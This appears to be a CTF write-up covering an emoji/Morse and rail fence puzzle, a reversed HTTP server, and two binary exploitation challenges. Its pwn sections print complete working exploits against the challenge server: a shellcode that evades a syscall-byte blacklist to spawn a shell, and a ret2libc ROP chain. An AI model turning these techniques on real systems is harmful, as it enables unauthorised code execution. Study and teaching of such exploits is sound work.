🚂🚂🚂🚂🚆🚂🚆🚂🚋🚂🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚂🚋🚋🚆🚋🚋🚋🚆🚂🚂🚋🚆🚂🚋🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚋🚂🚆🚂🚋🚂🚆🚂🚂🚆🚋🚋🚂🚂🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚆🚋🚋🚋🚋🚋🚆🚂🚋🚋🚋🚋🚆🚂🚂🚋🚋🚋🚆🚋🚂🚂🚆🚋🚋🚋🚋🚋🚆🚂🚋🚆🚂🚋🚋🚋🚋🚆🚂🚂🚋🚂🚆🚂🚂🚋🚂🚆🚂🚂🚋🚂🚆🚂🚋🚆🚋🚂🚋🚂🚆🚂🚂🚂🚂🚋🚆🚂🚂🚋🚋🚋🚆🚋🚂🚂🚆🚋🚂🚂🚂🚂🚆🚂🚋🚆🚂🚋🚆🚂🚆🚋🚋🚋🚋🚋🚆🚋🚋🚋🚋🚋🚆🚋🚂🚋🚂🚆🚂🚂🚂🚂🚂🚆🚂🚂🚂🚂🚋🚆🚋🚋🚋🚋🚋🚆🚋🚋🚂🚂🚂🚆🚋🚋🚋🚂🚂🚆🚂🚋🚆🚋🚂🚂🚆🚂🚂🚂🚋🚋🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚂🚆🚂🚋🚆🚋🚋🚆🚂🚂🚋🚆🚂🚆🚂🚋🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚂🚆🚂🚆🚂🚋🚆🚂🚋🚂🚂🚆🚂🚋🚂🚂🚆🚋🚂🚋🚋🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚂🚂🚆🚂🚂🚆🚋🚂🚋🚆🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚆🚂🚋🚂🚆🚂🚋🚆🚂🚂🚆🚋🚂🚆🚋🚋🚂🚂🚋🚋🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚋🚆🚋🚂🚆🚋🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚋🚂🚆🚂🚋🚆🚂🚂🚂🚋🚆🚋🚋🚋🚆🚂🚋🚂🚆🚂🚂🚆🚋🚆🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚂🚆🚂🚂🚋🚆🚋🚋🚆🚋🚂🚂🚂🚆🚂🚆🚂🚋🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚂🚂🚆🚂🚂🚂🚆🚂🚂🚂🚂🚂🚂🚂🚆🚋🚋🚋🚂🚂
```
</details>

Some analogy from the challenge description:
Gist - Github Gist
Samuel - Inventor of Morse Code

A text file with a bunch of train emoji 🚆🚂🚋 was given. We assume it is some type of encoding.

Notice that 🚆 comes in short, 1 character bursts while others took various length. This closely coincides with morse code, where it uses `.-/ ` and the character ` ` comes in short bursts. Therefore we try to replace `🚆🚂🚋` into ` .-` respectively.

Trying to decode with this presented one problem - there exists `.......` which is not a valid morse code. As the word separator `/` is still unassigned, we assume it is that and try to decode again. Doing it this way now gives a legible text that reads the following:
```!
here is your prize e012d0a1fffac42d6aae00c54078ad3e samuel really likes train, and his favorite number is 8
```

Three pieces of information can be obtained from the string above, namely `e012d0a1fffac42d6aae00c54078ad3e`, `train`, and `8`. The keyword train coincides with a classic cipher called [rail fence cipher](https://en.wikipedia.org/wiki/Rail_fence_cipher) which rearranges letters using a grid traversing diagonally. The cipher can be customised with different grid height, which we assume this is what 8 signifies.

A hint was later released that mentioned something has to do with GitHub Gist. The `e012d0a1fffac42d6aae00c54078ad3e` loos like a gist hash, so we browse with the hash and got back a secret gist under the `umcybersec` account.
```http
$ curl -i https://gist.github.com/e012d0a1fffac42d6aae00c54078ad3e
HTTP/2 302
content-type: text/html; charset=utf-8
content-length: 0
location: https://gist.github.com/umcybersec/e012d0a1fffac42d6aae00c54078ad3e
```

The gist contained all kinds of weird blocks as follows:
```
 █   ██ ▓ ▓░   █ █▀▒  ▒ ░▒█  █ ▒█   ▀█░  ░ ██░▒▒ ▓▒█▒▓░ ▒▒░ ▒░▓   ░ ░░  ░        ░    ░        ░          █ █    ▓██ █▄ ████ ▓█ █ ▓ █▓  █ ▀███ ▒█▓ ▀
█▒  █  ░█ █ ▄ ▓█▄  ░    █ █░▀█▓ ▒█  ▒▒█░ ▄░███░░█ ░█▒▓ ██▒███  ░▒▓░▒   ▓░░ ░ ░  ░ ░▒  ░░▒  ░▒        ▒ ░
  ░ ░                    ░░    ░    ░     
                     ▓▓ ▒  ███▓█  ████████░ █▒█░█▒▒  ▒█▀███▒█ ▒██░ ▒█░▓█ ▓ █▓░░█ ░▒░░░ █ ░ █▄▒ ███ ▓ █ █  ░██▒██░▒█▒█ ██████░░▒  ░░▒ ░   ▒ ░ ░ ░ ░░░▒░      ░  ▒▒ ░░   ░░░   ░░ ░░     ░ ░▒  ░          ░                               █  ████▀███  █ █████ ▓ ██▒██ ▓█▒ ▄▒██ ██ █▒██▒▒ ██▒ ▒ ▀██ █▒█████▒▒█ ▓█  ▄█▄█▒█ ░▓▓
▓░░█▓█▒ ████ ▒░██▒▒ 
 ░  ▒░  ░░▒ ▒░ ▒░       ▒▒   ░ ░░ ▒ ░       ░░░   ░      ░    ░  ░     ░  ░        ░           ░          █ ▓█ ░████▄  ▄▓ █▓██░█▒▒█▓░▒██▓█  █▒  █▒ ░ ░███░██▒▒ ▄ ███▓███░ ██ ███▒ ▄ ▄▄▒█▄▒▒█▒░██▒▒█▒ ░█████▒ ▒▒▒ ░▒▒ ░ ░▓  ▒▒░▒▒█ ▓▒▒  ░░░   ▒   ░     ▒ ░░   ▒           ▒    ░   ░           ░    ░                          ██ ▄██▓█ ▄  █ █▄█████ ▒█  █  ██ █▓  ▓ █ █ ▒███▓  █    ▓█ █▓█
░▒█ ░ █ ▒ ▒ ▄ ██ ██ ░███░██ █▒▒█▀▓█  ░░ ▒█  ░▓▒ ▒ ▓  ░ ▒░▒  ▒ 
 ░▒ ░   ▒ ░  ░░     ░   ░░     ░░     ░      ░      ░░                              
 ░ ██ ▄██ █ ▄ ▄█ █▄█ ▓▒█  ░█▓▓ ▀▀▀ ▓█░  ▓▓█░  ░   ░██ ▒█  ▓░▒   █░░ ░░▓░▓ ▓▄▄█ █ █▓░█▒██ ██ █ ░█  █ ░ █░██ ▓ ░░░ ░░░░  ▓ ░▒▒ ░ ▒  ░ ░░ ░  ▒ ░ ░ ░▒  ░           ░   ░        ░ ░  ░       ░                         █ █▄ █▄█ ▄
▓  ▒   █▒▒   ▒▄██ ▒▒ █ █ █▓█▒  ███▓▓▒░▒ ██░▒ ░░░  ▓░ ░   ░    ░  ▒░░  ░ ░
      ░              
```

However, as we now know it has something to do with rail fence cipher, we try to put it in a [decoder](https://www.boxentriq.com/code-breaking/rail-fence-cipher). The decoded result looked like ASCII art, once we look at it full length without wrap, clear letters showed up:
![image](https://hackmd.io/_uploads/BkVKDoFR1e.png)

Flag: `umcs{willow_tree_campsite}`

## Reverse Engineering
### htpp-server
<details>
  <summary>Description</summary>

I created a http server during my free time

34.133.69.112 port 8080
    
File: `server.unknown`
</details>

1. Reading the file tells us it is an ELF executable (ELF signatue is seen in the first few bytes).
![image](https://hackmd.io/_uploads/Byb-_jtAke.png)
2. Analyse in IDA -> Strings view, found mention of `/flag`.
![image](https://hackmd.io/_uploads/Hkv8OjYRJe.png)
3. Find its [xref](https://www.oreilly.com/library/view/practical-malware-analysis/9781593272906/ch06s03.html) (only 1 result), decompile and we get the following.
```c
v10 = __readfsqword(0x28u);
puts("[*]Handling a Connection!");
ptr = malloc(0x400uLL);
v1 = malloc_usable_size(ptr);
if ( (int)recv(a1, ptr, v1, 0) < 0 )
{
  puts("[!]Failed! No Bytes Received!");
  exit(1);
}
if ( strstr((const char *)ptr, "GET /goodshit/umcs_server HTTP/13.37") )
{
  stream = fopen("/flag", "r");
  if ( stream )
  {
    memset(buf, 0, 0x400uLL);
    n = fread(buf, 1uLL, 0x3FFuLL, stream);
    fclose(stream);
    v3 = strlen("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n");
    send(a1, "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n", v3, 0);
    send(a1, buf, n, 0);
  }
  else
  {
    v2 = strlen("HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n\r\nCould not open the /flag file.\n");
    send(a1, "HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n\r\nCould not open the /flag file.\n", v2, 0);
  }
}
else
{
  v4 = strlen("HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n\r\nNot here buddy\n");
  send(a1, "HTTP/1.1 404 Not Found\r\nContent-Type: text/plain\r\n\r\nNot here buddy\n", v4, 0);
}
return v10 - __readfsqword(0x28u);
```

Long story short, the following two lines translates to: *If I see this string in request, I give you flag.*
```c
if ( strstr((const char *)ptr, "GET /goodshit/umcs_server HTTP/13.37") )
{
  stream = fopen("/flag", "r");
```

So we do exactly what it wants, and got the flag we wanted.
```http
$ nc 34.133.69.112 8080
GET /goodshit/umcs_server HTTP/13.37
HTTP/1.1 200 OK
Content-Type: text/plain

umcs{http_server_a058712ff1da79c9bbf211907c65a5cd}
^C
```


## Pwn
### babysc
<details>
  <summary>Description</summary>

shellcode

`34.133.69.112 port 10001`
    
Files: `babysc`, `babysc.c`, `Dockerfile`
<details>
  <summary>Source Code</summary>
    
```c
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>


void *shellcode;
size_t shellcode_size;


void vuln(){
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    shellcode = mmap((void *)0x26e45000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);

	puts("Enter 0x1000");
	shellcode_size = read(0, shellcode, 0x1000);
    for (int i = 0; i < shellcode_size; i++)
    {
        uint16_t *scw = (uint16_t *)((uint8_t *)shellcode + i);
        if (*scw == 0x80cd || *scw == 0x340f || *scw == 0x050f)
        {
            printf("Bad Byte at %d!\n", i);
            exit(1);
        }
    }
   puts("Executing shellcode!\n");
	((void(*)())shellcode)();
}



int main(){

	vuln();


	return 0;

}
```
</details>
</details>
    
This challenge hosts a shellcode runner. We just need to craft a shellcode that can read us the flag on server.
    
To make our life harder, the challenge included a blacklist of hex value `0x80cd`, `0x340f`, and `0x050f`, which represented the `int 0x80`, `SYSENTER`, and `SYSCALL` opcode respectively.
    
We first start with the shell template of pwntools `shellcraft.amd64.linux.sh()` as follows:
```asm
/* execve(path='/bin///sh', argv=['sh'], envp=0) */
/* push b'/bin///sh\x00' */
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
mov rdi, rsp
/* push argument array ['sh\x00'] */
/* push b'sh\x00' */
push 0x1010101 ^ 0x6873
xor dword ptr [rsp], 0x1010101
xor esi, esi /* 0 */
push rsi /* null terminate */
push 8
pop rsi
add rsi, rsp
push rsi /* 'sh\x00' */
mov rsi, rsp
xor edx, edx /* 0 */
/* call execve() */
push SYS_execve /* 0x3b */
pop rax
syscall
```
    
If we feed this to the binary, it won't run because `syscall` instruction opcode is blacklisted. To circumvent it, we need to generate syscall instruction at runtime.

We do this by first pushing a dummy onto stack, then overwriting it with `0x040f`, increment 1 to the second byte so it evalutes to `0x050f`, and finally call it.
```asm
/* make our own syscall */
push rax
mov word ptr [rsp], 0x040f /* syscall is 0x050f */
inc byte ptr [rsp+1]
call rsp
```

Making use of the above we can compile them into an exploit script as follows:
```py
from pwn import *

context.arch = 'amd64'

# from shellcraft.amd64.linux.sh()
assembly = shellcode='''
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    /* syscall */
               
    /* make our own syscall */
    push rax
    mov word ptr [rsp], 0x040f /* syscall is 0x050f */
    inc byte ptr [rsp+1]
    call rsp
'''

shellcode = asm(assembly)
print(f"Shellcode length: {len(shellcode)}")

# retry until the shellcode runs
for attempt in range(1, 101):
    print(f"Attempt {attempt}: Sending shellcode...")
    
    if attempt > 1:
        p.close()

    p = remote('34.133.69.112', 10001)
    p.recvuntil(b'Enter 0x1000\n')
    
    # pad NOP to 0x1000 and send the shellcode
    p.send(shellcode.ljust(0x1000, b'\x90'))
    
    # Check if execution was successful
    try:
        response = p.recvline(timeout=2)
        print(response.decode())
        break
    except EOFError:
        print(f"Attempt {attempt} failed (connection closed).")

p.interactive()
```
    
After getting a shell, we retrieve the flag using `cat /flag`. The flag is `umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a}`.


### liveleak
<details>
  <summary>Description</summary>

No desc

`34.133.69.112 port 10007`
    
Files: `chall`, `Dockerfile`, `ld-2.35.so`, `libc.so.6`
</details>

Dumping the executable into IDA we can find these 2 key functions in `chall`.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  initialize(argc, argv, envp);
  vuln();
  return 0;
}

char *vuln()
{
  char s[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("Enter your input: ");
  return fgets(s, 128, stdin);
}
```

64 byte buffer is assigned, `fgets` is called to write 128 bytes. Classic way to buffer overflow.
    
Running `checksec chall` we can see although stack canary is not present, NX bit is set and therefore we cannot just execute any shellcode we can leak on the stack.
```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x3ff000)
```

In this case, we can utilise the [ROP technique](https://en.wikipedia.org/wiki/Return-oriented_programming) to pop a shell by injecting pointers referring to useful function addresses (gadgets) in glibc.

To do that, we first want to leak the address of glibc. Luckily, the glibc is already provided for us (`libc.so.6`) and we don't need to manually find a compatible version.

We do this by crafting a ROP chain executing `puts@plt(puts@got)` to leak the runtime address of `puts@glibc`, then we call `main` again so we can perform further exploitation without closing the program (which will again randomise all addresses due to ASLR).
```python
rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])
print(rop.dump())
```
```
0x0000:         0x4012bd pop rdi; ret
0x0008:         0x404018 [arg0] rdi = got.puts
0x0010:         0x401094 puts
0x0018:         0x401292 0x401292()
```

To send the payload, we take the char array length of `char s[64]` + 8 bytes of saved RBP as padding, then append the actual payload behind. 
```python
padding = b"A" * (64 + 8)  # 64 bytes buffer + 8 bytes saved RBP

p.sendlineafter(b"Enter your input: ", padding + rop.chain())

leak = p.recvuntil(b"Enter your input:", drop=True).strip()
if not leak:
    log.error("Failed to leak address")
    exit(1)

# Parse the leaked address
puts_addr = u64(leak.ljust(8, b'\x00'))
log.success(f"Leaked puts address: {hex(puts_addr)}")
```
Upon successful leak, we will get a printout of some binary output that represent the runtime address of `puts@glibc`.

We can subtract address we just obtained with the offset of `puts` in base glibc to get the base address of glibc. Which we can use to calculate the runtime address of any function in glibc. We do not need to do this for our base executable `chall` because [PIE was not enabled](https://stackoverflow.com/a/76616122/10699343).
```python
libc.address = puts_addr - libc.symbols['puts']
log.info('libc base: {}'.format(hex(libc.address)))
```
With glibc base address set, we can resolve the runtime address for `system` function and the string `/bin/sh` to call a shell.
```python
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))
log.info(f"system() address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(binsh_addr)}")
```

Now we head our way to pop a shell. We can do this by simply calling `system(binsh_address)`. However, as this is an `amd64` binary (as indicated in `checksec`), we also need to [align the stack](https://7rocky.github.io/en/ctf/picoctf/binary-exploitation/heres-a-libc/#:~:text=This%20happens%20because%20of%20stack%20alignment.) [to a multiple of 16](https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/stack-alignment) for our ROP chain to work. We can do that by calling `ret` once before `system` to pop the stack and reduce it by 8 bytes.
```python
rop = ROP(libc)
rop.raw(rop.find_gadget(["ret"])[0])
rop.system(binsh_addr)
print(rop.dump())
```
```
0x0000:   0x77f20ba8e139 ret
0x0008:   0x77f20ba8f3e5 pop rdi; ret
0x0010:   0x77f20bc3d678 [arg0] rdi = 131881463174776
0x0018:   0x77f20bab5d70 system
```

Finally, we just send off the payload and get our shell.
```python
p.sendline(padding + rop.chain())
p.interactive()
```

This is the full exploit script used:
```python
#!/usr/bin/env python3
from pwn import *

import os
from pathlib import Path
script_dir = Path(__file__).parent.resolve()
os.chdir(script_dir)


context.update(arch='amd64', os='linux')
context.log_level = 'info'

LOCAL = 0
BINARY = './chall'
LD_PATH = './ld-2.35.so'
LIBC_PATH = './libc.so.6'

if LOCAL:
    p = process([LD_PATH, '--library-path', '.', BINARY])
else:
    p = remote('34.133.69.112', 10007)

elf = ELF(BINARY)
libc = ELF(LIBC_PATH)
padding = b"A" * (64 + 8)  # 64 bytes buffer + 8 bytes saved RBP

rop = ROP(elf)
rop.puts(elf.got['puts'])
rop.call(elf.symbols['main'])
print(rop.dump())

p.sendlineafter(b"Enter your input: ", padding + rop.chain())

leak = p.recvuntil(b"Enter your input:", drop=True).strip()
if not leak:
    log.error("Failed to leak address")
    exit(1)

# Parse the leaked address
puts_addr = u64(leak.ljust(8, b'\x00'))
log.success(f"Leaked puts address: {hex(puts_addr)}")

libc.address = puts_addr - libc.symbols['puts']
log.info('libc base: {}'.format(hex(libc.address)))

system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh\x00'))
log.info(f"system() address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(binsh_addr)}")

rop = ROP(libc)
rop.raw(rop.find_gadget(["ret"])[0])
rop.system(binsh_addr)
print(rop.dump())

p.sendline(padding + rop.chain())
p.interactive()
```

After getting shell, just run `cat /flag` to obtain the flag `umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}`.
